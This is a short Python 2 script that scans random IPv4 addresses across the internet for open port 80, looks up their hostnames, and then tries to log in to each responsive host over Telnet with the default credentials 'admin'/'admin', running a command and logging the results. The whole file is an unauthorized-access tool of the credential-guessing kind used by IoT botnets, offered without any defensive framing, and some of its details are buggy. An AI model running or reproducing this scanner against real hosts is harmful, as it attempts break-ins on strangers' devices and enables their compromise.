#Random IP Generator with Socket and Telnet support.#
import socket, os, time, telnetlib, datetime
from random import randint

a = []
b = []
c = []
d = []
today = []
def WriteLog():
	print('Keyboard Interrupt Detected.\n')
	fp.write('Hosts Attempted(')
	fp.write(str(a))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Working Hosts(')
	fp.write(str(b))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Working Host Lookup(')
	fp.write(str(c))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Telnet Information(')
	fp.write(str(d))
	fp.write(')\n')
	fp.close()
	s.close()
		
def randip():
    while True:
        yield ".".join(str(randint(1, 255)) for i in range(4))

log = datetime.date.today()
today.append(log)
fp = open(str(today[0]) + "_randip_log.txt", 'w')
for address in randip():
	try:
		try:
			#Socket tests with a timeout of 1.8 seconds#
			s = socket.socket()
			s.settimeout(1.8)
			s.connect((address, 80))
			print address, "WORKS!!!"
			b.append(address)
			hostbyadr = socket.gethostbyaddr(address)
			print hostbyadr
			c.append(hostbyadr)
			print "\n"
			print('Beginning Telnet attempt on %s\n' % address)
			#Default telnet connection using admin as user and password#
			try:
				tn = telnetlib.Telnet(address, 3)
				tn.read_until("login: ")
				time.sleep(3)#Sometimes telnet takes a second after login#
				tn.write('admin' + '\n')
				tn.read_until('Password: ')
				tn.write('admin' + '\n')
				tn.write("ls\n")
				tn.write("exit\n")
				print tn.read_all()
				d.append(tn.read_all())
				tn.close()
			except EOFError:
				print(EOFError, address)
				print '\n'
				tn.close()
				pass
			except KeyboardInterrupt:
				WriteLog()
				break
		except socket.timeout:
			print(socket.timeout, '%s timeout' % address)
			print '\n'
			pass
		except socket.herror:
			print(socket.herror, 'Error getting host by address on %s' % address)
			print '\n'
			pass
		except socket.error:
			print(socket.error, 'Failed to connect to %s' % address)
			print '\n'
			a.append(address)
			pass
	except KeyboardInterrupt:
		WriteLog()
		break
